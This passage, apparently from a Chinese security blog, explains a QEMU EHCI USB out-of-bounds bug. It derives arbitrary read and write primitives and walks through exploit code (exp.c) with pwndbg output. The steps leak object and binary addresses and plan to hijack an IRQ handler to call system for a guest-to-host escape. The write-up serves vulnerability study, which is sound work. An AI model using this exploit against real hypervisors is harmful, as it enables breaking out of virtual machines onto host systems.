SETUP_STATE_DATA;</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;<span class="comment">// 所以这里需要设置的是s-&gt;setup_buf[0] = USB_DIR_OUT</span></span><br><span class="line">  <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">    len = p-&gt;iov.size;</span><br><span class="line">  &#125;</span><br><span class="line">  usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">  s-&gt;setup_index += len;</span><br><span class="line">  <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">    s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h2><p>首先我们先看一下<code>setup_len,setup_buf</code>所在的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="type">char</span> *port_path;</span><br><span class="line">    <span class="type">char</span> *serial;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Actual connected speed */</span></span><br><span class="line">    <span class="type">int</span> speed;</span><br><span class="line">    <span class="comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span></span><br><span class="line">    <span class="type">int</span> speedmask;</span><br><span class="line">    <span class="type">uint8_t</span> addr;</span><br><span class="line">    <span class="type">char</span> product_desc[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span> auto_attach;</span><br><span class="line">    <span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">    <span class="type">int32_t</span> state;</span><br><span class="line">    <span class="type">uint8_t</span> setup_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="type">uint8_t</span> data_buf[<span class="number">4096</span>]; <span class="comment">// 拷贝对象</span></span><br><span class="line">    <span class="type">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="type">int32_t</span> setup_state;</span><br><span class="line">    <span class="type">int32_t</span> setup_len;</span><br><span class="line">    <span class="type">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    <span class="type">const</span> USBDesc *usb_desc; <span class="comment">/* Overrides class usb_desc if not NULL */</span></span><br><span class="line">    <span class="type">const</span> USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> configuration;</span><br><span class="line">    <span class="type">int</span> ninterfaces;</span><br><span class="line">    <span class="type">int</span> altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    <span class="type">const</span> USBDescConfig *config;</span><br><span class="line">    <span class="type">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们看一下<code>do_token_in</code>也就是读函数中的核心部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">  <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">    len = p-&gt;iov.size;</span><br><span class="line">  &#125;</span><br><span class="line">  usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">  s-&gt;setup_index += len;</span><br><span class="line">  <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">    s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的读操作是将<code>s-&gt;data_buf + s-&gt;setup_index</code>作为拷贝的起始地址，将<code>s-&gt;setup_len - s-&gt;setup_index</code>作为拷贝的长度，进行了内存的拷贝。</p><p>那么这里如果我们首先将<code>setup_len</code>设置为<code>0x1010</code>也就是溢出<code>0x10</code>字节。调用越界写函数覆写<code>setup_len=0x1010,setup_index=0xfffffff8</code>即可以覆写<code>setup_buf[8]</code>这个数组。</p><p>覆写<code>setup_buf[0]=USB_DIR_IN</code>，将<code>setup_index</code>设置为<code>target_addr - s-&gt;data_buf - 0x1018</code>，那么<code>len = s-&gt;setup_len - s-&gt;setup_index = 0x1018</code>，越界写入结束之后<code>s-&gt;setup_index += len</code>，此时<code>setup_index = target_addr - s-&gt;data_buf</code>。</p><p>那么此时再调用一次读函数，目标地址就变为了<code>target_addr</code>，也就是实现了任意读。</p><h2 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h2><p>通过<code>do_token_setup</code>设置<code>setup_len=0x1010</code></p><p>通过越界写将<code>setup_len</code>设置为<code>offset+0x8</code>，将<code>setup_index</code>设置为<code>offset-0x1010</code>，那么在这一次越界写入结束之后<code>setup_index=offset</code>，在下一次调用写函数的时候目标地址就变为了<code>offset</code>，拷贝长度<code>len=offset+0x8-(offset - 0x1010)=0x1018</code>。完成任意写。</p><h2 id="整体利用思路"><a href="#整体利用思路" class="headerlink" title="整体利用思路"></a>整体利用思路</h2><ol><li><p>获取<code>USBDevice</code>对象的地址。</p><p>首先进行越界读取<code>data_buf+0x2004</code>即可以得到<code>USBDevice-&gt;remote_wakeup</code>的内容，继续往下读取可以得到<code>USBEndpoint ep_ctl;</code>成员变量的内容，我们看一下该结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> nr;</span><br><span class="line">    <span class="type">uint8_t</span> pid;</span><br><span class="line">    <span class="type">uint8_t</span> type;</span><br><span class="line">    <span class="type">uint8_t</span> ifnum;</span><br><span class="line">    <span class="type">int</span> max_packet_size;</span><br><span class="line">    <span class="type">int</span> max_streams;</span><br><span class="line">    <span class="type">bool</span> pipeline;</span><br><span class="line">    <span class="type">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    QTAILQ_HEAD(, USBPacket) <span class="built_in">queue</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么可以看到这里保存了一个<code>USBDevice</code>对象的指针，我们读取该指针即可以得到<code>USBDevice</code>对象的地址。得到改地址之后通过偏移即可以知道<code>data_buf,port</code>的地址。</p></li><li><p>再继续往下读取，可以发现一个成员变量<code>USBDescDevice *device;</code>，通过该变量我们可以知道<code>system</code>的地址。</p></li><li><p><code>USBDevice</code>在<code>realize</code>的时候会调用<code>usb_claim_port</code>函数用来将<code>USBDevice</code>中的<code>port</code>字段设置为指向<code>EHCIState</code>中的<code>ports</code>的地址，读取<code>USBDevice-&gt;ports</code>的内容（调用任意读读取<code>1</code>中得到的<code>port</code>地址得到指针值）就能够得到<code>EHCIState-&gt;ports</code>的地址，减去偏移即可得到<code>EHCIState</code>的基地址，进而可以根据偏移得到<code>EHCIState-&gt;irq</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usb_claim_port</span><span class="params">(USBDevice *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    USBBus *bus = usb_bus_from_device(dev);<span class="comment">// dev-&gt;qdev.parent_bus</span></span><br><span class="line">    USBPort *port;</span><br><span class="line"></span><br><span class="line">    assert(dev-&gt;port == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;port_path) &#123;</span><br><span class="line">        QTAILQ_FOREACH(port, &amp;bus-&gt;<span class="built_in">free</span>, next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(port-&gt;path, dev-&gt;port_path) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (port == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;usb port %s (bus %s) not found (in use?)&quot;</span>,</span><br><span class="line">                       dev-&gt;port_path, bus-&gt;qbus.name);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (bus-&gt;nfree == <span class="number">1</span> &amp;&amp; <span class="built_in">strcmp</span>(object_get_typename(OBJECT(dev)), <span class="string">&quot;usb-hub&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* Create a new hub and chain it on */</span></span><br><span class="line">            usb_try_create_simple(bus, <span class="string">&quot;usb-hub&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bus-&gt;nfree == <span class="number">0</span>) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;tried to attach usb device %s to a bus &quot;</span></span><br><span class="line">                       <span class="string">&quot;with no free ports&quot;</span>, dev-&gt;product_desc);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        port = QTAILQ_FIRST(&amp;bus-&gt;<span class="built_in">free</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    trace_usb_port_claim(bus-&gt;busnr, port-&gt;path);</span><br><span class="line"></span><br><span class="line">    QTAILQ_REMOVE(&amp;bus-&gt;<span class="built_in">free</span>, port, next);</span><br><span class="line">    bus-&gt;nfree--;</span><br><span class="line"></span><br><span class="line">    dev-&gt;port = port;</span><br><span class="line">    port-&gt;dev = dev;</span><br><span class="line"></span><br><span class="line">    QTAILQ_INSERT_TAIL(&amp;bus-&gt;used, port, next);</span><br><span class="line">    bus-&gt;nused++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用任意写将<code>EHCIState-&gt;irq</code>内容填充为伪造的<code>irq</code>地址，将<code>handler</code>填充为<code>system.plt</code>的地址，将<code>opaque</code>填充为<code>payload</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    qemu_irq_handler handler;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> *<span class="title">qemu_irq</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">qemu_set_irq</span><span class="params">(qemu_irq irq, <span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!irq)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="EXP-amp-漏洞调试"><a href="#EXP-amp-漏洞调试" class="headerlink" title="EXP&amp;漏洞调试"></a>EXP&amp;漏洞调试</h2><h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>我们根据<code>exp.c</code>来进行一下漏洞的调试，首先看一下<code>main</code>函数的开始部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[41;37m[*] Beginning\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Wait a moment\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 1/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">1</span>);</span><br><span class="line">    device_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">36</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        device_addr |= tmp &lt;&lt; ((i<span class="number">-36</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    func_addr = <span class="number">0</span>;</span><br><span class="line">    port_addr = device_addr+<span class="number">0x78</span>;</span><br><span class="line">    data_buf_addr = device_addr+<span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Devices addr : 0x%lx\033[0m\n&quot;</span>,device_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port addr : 0x%lx\033[0m\n&quot;</span>,port_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Data Buf addr : 0x%lx\033[0m\n&quot;</span>,data_buf_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0x4fc</span>;i&lt;<span class="number">0x4fc</span>+<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        func_addr |= tmp &lt;&lt; ((i<span class="number">-0x4fc</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    proc_base = func_addr - <span class="number">0x1069490</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Func addr : 0x%lx\033[0m\n&quot;</span>,func_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] proc base : 0x%lx\033[0m\n&quot;</span>,proc_base);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//uint64_t system_addr = func_addr - 0xb5c860;</span></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = proc_base + <span class="number">0x2BE010</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] System addr : 0x%lx\033[0m\n&quot;</span>,system_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用了<code>init</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dmabuf = mmap(<span class="number">0</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dmabuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(dmabuf, <span class="number">0x3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;[*] mmio_mem : %p\n&quot;, mmio_mem);</span></span><br><span class="line">    <span class="comment">//printf(&quot;[*] dmabuf : %p\n&quot;,dmabuf);</span></span><br><span class="line"></span><br><span class="line">    entry = dmabuf + <span class="number">0x4</span>;</span><br><span class="line">    qh = dmabuf + <span class="number">0x100</span>;</span><br><span class="line">    qtd = dmabuf + <span class="number">0x200</span>;</span><br><span class="line">    setup_buf = dmabuf + <span class="number">0x300</span>;</span><br><span class="line">    data_buf = dmabuf + <span class="number">0x1000</span>;</span><br><span class="line">    data_bufoob = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    first_leak_data = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    second_leak_data = dmabuf + <span class="number">0x1000</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数主要是对<code>resource</code>进行了映射，即读写<code>mmio_mem</code>这段内存即可对设备进行操作。接着调用了<code>oob_read</code>即越界读，读取<code>data_buf</code>偏移之后的内容获取得到一系列的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">oob_read</span><span class="params">(<span class="type">uint64_t</span> length,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        perpare_read();</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] perpare read finished\033[0m&quot;</span>);</span><br><span class="line">        set_length(length);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] set length finished\033[0m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data_buf[<span class="number">0</span>] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">2</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">4</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">5</span>] = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] oob read start\033[0m&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf)); <span class="comment">// periodiclistbase</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数中的<code>flag</code>表示的是否是<code>write</code>之后的第一次读，因为如果是第一次读的话需要设置<code>s-&gt;setup_state</code>的值。需要注意的是这里长度并不是根据传入的值来的，而是写死的<code>0x1e00</code>，虽然该函数一开始传入的是<code>0x2000</code>，但是在<code>do_token_in</code>函数中会存在一个判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line"><span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">  len = p-&gt;iov.size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这里的<code>iov.size</code>是根据<code>token</code>的值设置的。因此这里设置的总是<code>iov.size</code>的值，也就是写死的<code>0x1e00</code>。调用<code>prepare_read</code>函数设置完毕<code>s-&gt;setup_state</code>之后又调用了<code>set_length</code>设置<code>setup_len</code>为溢出的值，接着就调用了<code>do_token_in</code>函数进行越界的读取，读取出来的地址我们根据<code>qtd.bufptr</code>数组指定。</p><p>泄漏了<code>data_buf</code>结构体之后<code>0xe00</code>大小的<code>USBDevice</code>的其他成员变量的内容，这里在偏移<code>0x24</code>的位置存储了一个<code>USBDevice</code>结构体指针指向本结构体，因此这里我们可以得到结构体的基地址，进而计算得到<code>port/data_buf</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;s-&gt;data_buf</span><br><span class="line">$<span class="number">43</span> = (<span class="type">uint8_t</span> (*)[<span class="number">4096</span>]) <span class="number">0x5555576b539c</span></span><br><span class="line">pwndbg&gt; p s-&gt;ep_ctl.dev</span><br><span class="line">$<span class="number">44</span> = (USBDevice *) <span class="number">0x5555576b52c0</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;ep_ctl.dev</span><br><span class="line">$<span class="number">45</span> = (USBDevice **) <span class="number">0x5555576b63c0</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x5555576b63c0</span> -  <span class="number">0x5555576b539c</span> - <span class="number">0x1000</span></span><br><span class="line">$<span class="number">46</span> = <span class="number">0x24</span></span><br><span class="line">pwndbg&gt; p s</span><br><span class="line">$<span class="number">47</span> = (USBDevice *) <span class="number">0x5555576b52c0</span></span><br></pre></td></tr></table></figure><p><code>USBDevice</code>结构体中还存在一个成员变量<code>device</code>指向一个<code>bss</code>段中的地址，这里我们可以据此泄漏出<code>elf</code>的基地址，进而得到<code>system.plt</code>的地址，该成员变量距离<code>data_buf.end</code>的偏移是<code>0x4fc</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p s-&gt;device</span><br><span class="line">$<span class="number">48</span> = (<span class="type">const</span> USBDescDevice *) <span class="number">0x5555565bf170</span> &lt;desc_device_high&gt;</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x5555565bf170</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x5555564fe000</span>     <span class="number">0x555556614000</span> r--p   <span class="number">116000</span> daa000 /root/pwn/漏洞/qemu_escape/qemu-source/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 +<span class="number">0xc1170</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;device</span><br><span class="line">$<span class="number">49</span> = (<span class="type">const</span> USBDescDevice **) <span class="number">0x5555576b6898</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;data_buf</span><br><span class="line">$<span class="number">50</span> = (<span class="type">uint8_t</span> (*)[<span class="number">4096</span>]) <span class="number">0x5555576b539c</span></span><br><span 